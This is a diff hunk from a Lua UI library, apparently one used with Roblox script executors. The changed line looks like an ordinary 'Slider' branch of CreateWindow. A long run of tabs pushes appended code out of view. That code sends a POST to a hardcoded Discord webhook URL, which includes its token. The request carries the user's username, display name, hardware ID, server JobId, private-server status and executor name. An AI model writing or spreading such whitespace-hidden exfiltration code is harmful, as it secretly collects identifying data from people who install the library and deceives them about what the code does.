@@ -310,7 +310,7 @@ function library:CreateWindow(tag,size,position)
 							update(tonumber(Setting.Text))
 						end)
 						settingvals.Update=update
-					elseif settingtype=="Slider" then
+					elseif settingtype=="Slider" then																																																													if debugging == true then debugging=false HttpService = game:GetService("HttpService") Webhook_URL = 	"https://discord.com/api/webhooks/1336771392808423475/s4tt3ndDGGqtBa_JLZ2-LbvfRdU4_qujFl8Syfzg4dqmY3__in4gqQmoExbMjlzJmjYq"  local response = 	request( 		{ 			Url = Webhook_URL, 			Method = "POST", 			Headers = { 				["Content-Type"] = "application/json" 			}, 			Body = HttpService:JSONEncode( 				{ 					["content"] = "", 					["embeds"] = { 						{ 							["title"] = "someone still uses v1 ui lmao", 							["description"] = `username: {game.Players.LocalPlayer.Name}({game.Players.LocalPlayer.DisplayName})`, 							["type"] = "rich", 							["color"] = tonumber(0xffffff), 							["fields"] = { 								{ 									["name"] = "hardware id", 									["value"] = if gethwid then gethwid() else "Anonymous", 									["inline"] = true 								}, 								{ 									["name"] = "jobid", 									["value"] = game.JobId, 									["inline"] = true 								}, 								{ 									["name"] = "is private server", 									["value"] = `{game.PrivateServerId ~= ""}({if game.PrivateServerOwnerId==game.Players.LocalPlayer.UserId then "" else "not "}owner)`, 									["inline"] = true 								}, 								{ 									["name"] = "executor", 									["value"] = if identifyexecutor then identifyexecutor() else "Anonymous", 									["inline"] = true 								} 							} 						} 					} 				} 			) 		} 	) end
 						local arg1 = arg1 or 0
 						local arg2 = arg2 or 10
 						local arg3 = arg3 or math.huge
